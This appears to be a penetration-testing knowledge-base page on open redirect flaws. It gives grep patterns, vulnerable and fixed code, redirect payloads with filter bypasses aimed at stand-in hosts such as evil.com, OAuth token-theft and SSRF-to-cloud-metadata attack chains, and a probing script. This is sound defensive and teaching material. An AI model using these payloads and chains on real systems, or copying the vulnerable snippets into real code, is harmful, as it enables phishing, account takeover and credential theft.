# Open Redirect

**Tags:** #low #medium #open-redirect #phishing #oauth #ssrf
**OWASP:** A01:2021 Broken Access Control
**CVSS Base:** 3.1 (Low isolated) — 8.1 (High in chain with OAuth/SSRF)

---

## 📖 What it is

Open Redirect occurs when an endpoint accepts a URL as a parameter and redirects the user to it without validation. On its own the impact is low (phishing). Chained with OAuth or SSRF, it becomes critical.

---

## 🔍 `grep_search` Tactics

```
redirect(req.query
header("Location:", $_GET
res.redirect(req.query
res.redirect(req.body
window.location = searchParams
location.href = params
return redirect(
next=
returnUrl=
redirectTo=
callback=
url=
redirect_uri=
```

---

## 💣 Vulnerable Code Examples

```python
#  VULNERABLE  Flask
@app.get('/login')
def login():
    next_url = request.args.get('next', '/')
    # After login, redirects without validation
    return redirect(next_url)  # redirects to any URL!
```

```javascript
//  VULNERABLE  Express
app.get('/logout', (req, res) => {
    req.session.destroy();
    const returnUrl = req.query.returnUrl || '/';
    res.redirect(returnUrl);  // redirects without validation!
});
```

```php
//  VULNERABLE  PHP
$redirect = $_GET['redirect'];
header("Location: " . $redirect);
exit;
```

---

## 💣 Open Redirect Payloads

### Direct
```
https://target.com/login?next=https://evil.com
https://target.com/logout?returnUrl=https://phishing.com
https://target.com/redirect?url=//evil.com
https://target.com/out?to=https://attacker.com
```

### Bypassing Simple Filters

```
# Double slash
//evil.com
//evil.com/path

# Protocol-relative URL
//attacker.com

# Encoded
%2F%2Fevil.com
%68ttps://evil.com   (h encoded)

# @ character (user info in URL)
https://trusted.com@evil.com/
https://evil.com%09@trusted.com/

# Fragment
https://trusted.com#https://evil.com

# Attacker subdomain that looks like a trusted domain
https://trusted.com.evil.com/
https://evil.com/?next=trusted.com

# JavaScript scheme
javascript:alert(1)
javascript:location.href='https://evil.com'
```

---

## 🔗 Open Redirect in Critical Chains

### Chain 1: Open Redirect + OAuth — Token Theft

```
Pre-condition: OAuth app uses trusted.com in redirect_uri

1. Attacker discovers Open Redirect on trusted.com:
   https://trusted.com/redir?next=https://evil.com

2. Registers redirect_uri as:
   https://trusted.com/redir?next=https://evil.com

3. OAuth authorization URL:
   https://oauth-provider.com/auth?
     client_id=xxx&
     redirect_uri=https://trusted.com/redir?next=https://evil.com&
     response_type=code&
     scope=openid

4. Victim authorizes  code redirected to trusted.com
5. trusted.com redirects to evil.com with ?code=AUTHORIZATION_CODE
6. Attacker uses the code to obtain victim's access_token = Account Takeover
```

**Reclassification:** Open Redirect 🔵 Low — with OAuth = 🔴 Critical

---

### Chain 2: Open Redirect + SSRF — Whitelist Bypass

```
Pre-condition: SSRF endpoint validates only a domain whitelist

1. SSRF endpoint accepts: https://trusted-api.com/...
2. Open Redirect on trusted-api.com/redir?to=http://169.254.169.254/

3. SSRF payload:
   {"url": "https://trusted-api.com/redir?to=http://169.254.169.254/"}
   
4. Server validates: domain = trusted-api.com 
5. Server makes GET  trusted-api.com redirects to 169.254.169.254
6. AWS IAM credentials obtained
```

---

## 🛡️ Fix

```python
#  CORRECT  validate that the URL is relative or an allowed domain
from urllib.parse import urlparse, urljoin

ALLOWED_HOSTS = {'myapp.com', 'www.myapp.com'}

def safe_redirect(url, fallback='/'):
    """Redirects only to safe URLs within the same domain."""
    if not url:
        return fallback
    
    # Relative URL is safe
    if url.startswith('/') and not url.startswith('//'):
        return url
    
    parsed = urlparse(url)
    if parsed.netloc in ALLOWED_HOSTS:
        return url
    
    return fallback  # External URL  safe fallback

@app.get('/login')
def login():
    next_url = safe_redirect(request.args.get('next'))
    return redirect(next_url)
```

```javascript
//  CORRECT  Express with relative URL validation
function safeRedirect(url, req, res, fallback = '/') {
    if (!url) return res.redirect(fallback);
    
    // Only relative URLs (start with / but not with //)
    if (url.startsWith('/') && !url.startsWith('//')) {
        return res.redirect(url);
    }
    
    // Or explicitly allowed domains
    const parsed = new URL(url, `${req.protocol}://${req.hostname}`);
    const ALLOWED = new Set(['myapp.com', 'www.myapp.com']);
    
    if (ALLOWED.has(parsed.hostname)) {
        return res.redirect(url);
    }
    
    return res.redirect(fallback);
}
```

---

## 🧪 Validation Script

```python
# .tmp/validate_open_redirect.py
import requests

TARGET = "http://target.com"
REDIRECT_ENDPOINTS = [
    "/login",
    "/logout",
    "/redirect",
    "/out",
    "/go",
]
PARAMS = ["next", "url", "redirect", "returnUrl", "to", "goto", "return"]
ATTACKER = "https://attacker.com"

for endpoint in REDIRECT_ENDPOINTS:
    for param in PARAMS:
        payload_url = f"{TARGET}{endpoint}?{param}={ATTACKER}"
        r = requests.get(payload_url, allow_redirects=False, timeout=5)
        
        location = r.headers.get('Location', '')
        if ATTACKER in location:
            print(f"[🔴 VULN] Open Redirect: {payload_url}")
            print(f"  Location: {location}")
        elif r.status_code in [301, 302, 303, 307, 308]:
            print(f"[redirect] {payload_url}  {location[:100]}")
```

---

## 📌 References
- [[ssrf-server-side-request-forgery]]
- [[oauth-2.0-saml-protocol-attacks]]
- [[chain-exploit-butterfly-effect]]
- [PortSwigger Open Redirect](https://portswigger.net/web-security/dom-based/open-redirection)